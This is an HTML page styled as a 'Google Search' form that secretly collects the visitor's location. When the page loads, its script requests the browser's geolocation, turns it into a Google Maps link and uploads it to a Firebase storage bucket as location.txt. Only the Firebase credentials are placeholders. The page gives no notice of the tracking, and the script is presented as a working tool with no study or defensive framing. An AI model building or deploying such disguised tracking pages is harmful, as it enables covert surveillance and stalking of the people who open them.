<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Search</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .search-form {
            text-align: center;
        }
        .search-input {
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-right: 5px;
        }
        .search-button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .search-button:hover {
            background-color: #357ae8;
        }
    </style>
</head>
<body onload="uploadLocation()">
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage.js"></script>
    <div class="container">
        <form class="search-form" action="https://www.google.com/search" method="GET">
            <input class="search-input" type="text" name="q" placeholder="Search Google">
            <button class="search-button" type="submit">Search</button>
        </form>
    </div>
    <script>
        // Function to get current location and upload to Firebase
        function uploadLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    var mapLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

                    // Create a text file with the Google Maps link
                    var fileContent = "Current Location: " + mapLink;

                    // Initialize Firebase
                    var firebaseConfig = {
                        apiKey: "YOUR_API_KEY",
                        projectId: "YOUR_PROJECT_ID",
                        storageBucket: "YOUR_STORAGE_BUCKET"
                    };
                    firebase.initializeApp(firebaseConfig);

                    // Get a reference to the storage service, which is used to create references in your storage bucket
                    var storage = firebase.storage();

                    // Create a storage reference from our storage service
                    var storageRef = storage.ref();

                    // Create a reference to the location where the text file will be saved
                    var textRef = storageRef.child('location.txt');

                    // Create the file metadata
                    var metadata = {
                        contentType: 'text/plain'
                    };

                    // Upload the file and metadata
                    var uploadTask = textRef.putString(fileContent, 'raw', metadata);

                    // Listen for state changes, errors, and completion of the upload.
                    uploadTask.on('state_changed', function(snapshot) {
                        // Observe state change events such as progress, pause, and resume
                    }, function(error) {
                        // Handle unsuccessful uploads
                        console.error("Error uploading file: ", error);
                    }, function() {
                        // Handle successful uploads on complete
                        console.log("File uploaded successfully!");
                    });
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
    </script>
</body>
</html>
